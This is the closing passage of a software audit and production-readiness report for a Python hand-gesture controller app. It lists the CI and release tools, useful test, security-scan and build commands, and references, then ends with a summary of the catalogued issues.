|`atheris`|Fuzzing|Nightly CI|
|`mutmut`|Mutation testing|Nightly CI|
|`pip-audit`|Vulnerability scanning|CI security job|
|`safety`|Vulnerability scanning|CI security job|
|`bandit`|SAST for Python|CI security job|
|`semgrep`|SAST with custom rules|CI security job|
|`cyclonedx-bom`|SBOM generation|Release pipeline|
|`pre-commit`|Pre-commit hooks|Local, CI|
|`release-please`|Semantic versioning|Release pipeline|
|`setuptools-scm`|Version from git tags|Build|
|`pyinstaller`|Binary bundling|Release pipeline|
|`nsis`|Windows installer|Release pipeline|
|`hdiutil`|macOS DMG creation|Release pipeline|
|`fpm`|Linux .deb/.rpm|Release pipeline|
|`xcrun notarytool`|macOS notarization|Release pipeline|
|`signtool`|Windows Authenticode|Release pipeline|
### Appendix D — Useful commands
```bash
# Run all unit tests with coverage
pytest gesture\\\\\\\_controller/tests/unit/ --cov=gesture\\\\\\\_controller --cov-report=html --cov-fail-under=80
# Run only fast tests (skip slow, e2e, real\\\\\\\_mediapipe)
pytest -m "not slow and not e2e and not real\\\\\\\_mediapipe"
# Run security scans locally
pip-audit --strict
safety check
bandit -r gesture\\\\\\\_controller/
semgrep --config=auto gesture\\\\\\\_controller/
# Generate SBOM
cyclonedx-py environment -o sbom.cdx.json
# Build installer (Linux)
pyinstaller gesture\\\\\\\_controller.spec --distpath dist/linux --noconfirm
# Build installer (macOS — produces .app via BUNDLE)
pyinstaller gesture\\\\\\\_controller.spec --distpath dist/mac --noconfirm --windowed
# Build installer (Windows)
pyinstaller gesture\\\\\\\_controller.spec --distpath dist/win --noconfirm
# Verify install after pip install
gesture-controller-verify
# Run the app
gesture-controller
# Export diagnostics from tray (once implemented)
# Right-click tray icon → Export Diagnostics
```
### Appendix E — References
* One-Euro Filter paper: Casiez, G., Daniel, N., \& Roussel, N. (2012). "1€ Filter: A Simple Speed-based Low-pass Filter for Noisy Input in Interactive Systems." CHI '12.
* MediaPipe Hands: https://developers.google.com/mediapipe/solutions/vision/hand\_landmarker
* MediaPipe Tasks API: https://developers.google.com/mediapipe/solutions/vision/hand\_landmarker/python
* STRIDE: https://learn.microsoft.com/en-us/azure/security/develop/threat-modeling-tool-threats#stride-model
* SLSA: https://slsa.dev/
* CycloneDX: https://cyclonedx.org/
* PEP 639 (license-files): https://peps.python.org/pep-0639/
* PEP 517 (build backend): https://peps.python.org/pep-0517/
* PEP 660 (editable installs): https://peps.python.org/pep-0660/
\---
**End of report.** Total issues catalogued: 28 P0 + 80 P1 + \~50 P2 + \~25 P3 + \~10 P4 = **\~193 issues**. Apply the 13 patches in §7 to clear the P0 backlog. Follow the 4-sprint roadmap in §8 to v1.0. Use the CI/CD design in §9 and the deployment runbook in §10 to ship safely. Track the KPIs in §11 to verify production-readiness.
